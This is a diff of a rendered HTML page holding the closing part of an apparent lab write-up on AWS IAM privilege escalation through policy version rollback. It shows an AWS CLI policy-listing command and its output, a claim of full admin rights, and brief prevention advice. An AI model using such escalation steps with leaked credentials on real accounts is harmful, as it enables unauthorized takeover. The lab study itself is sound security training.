+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile raynor iam list-policies --only-attached --scope Local
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span> <span style=color:#0c6>&#34;Policies&#34;</span>: <span style=color:#2c5dcd>[</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PolicyId&#34;</span>: <span style=color:#0c6>&#34;ANPA5X73I5MBNC3PRT6CO&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Path&#34;</span>: <span style=color:#0c6>&#34;/&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;DefaultVersionId&#34;</span>: <span style=color:#0c6>&#34;v2&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;AttachmentCount&#34;</span>: 1,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PermissionsBoundaryUsageCount&#34;</span>: 0,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;IsAttachable&#34;</span>: true,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:46Z&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;UpdateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T18:28:50Z&#34;</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>}</span>
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd>]</span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Notice the default version has changed from <code>v1</code> to <code>v2</code>. At this point we have full administrative rights to this aws account.</p><hr><h3 id=prevention>Prevention</h3><p>So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.</p><ol><li>The most important is to not expose credentials. If we were not able to leverage raynors credentials we would not have been able to authenticate and further escalate privileges.</li><li>Limit what users can do. The policy associated with raynor allowed for too much access. I imagine in the real world a user with this set of actions at there disposal would likely have much more persmissions within the account.</li></ol></div></div><div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0><nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav><h5>contents</h5><ul class="nav post-sidenav"><li><nav id=TableOfContents><ul><li><ul><li><a href=#raynor>Raynor</a></li><li><a href=#versions>Versions</a></li><li><a href=#prevention>Prevention</a></li></ul></li></ul></nav></li></ul></nav></div></div></div></div><footer></footer></body><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
 <script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js integrity=sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1 crossorigin=anonymous></script>
 <script src=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js integrity=sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM crossorigin=anonymous></script>
-<script>includeHTML()</script>
-</html>
+<script>includeHTML()</script></html>
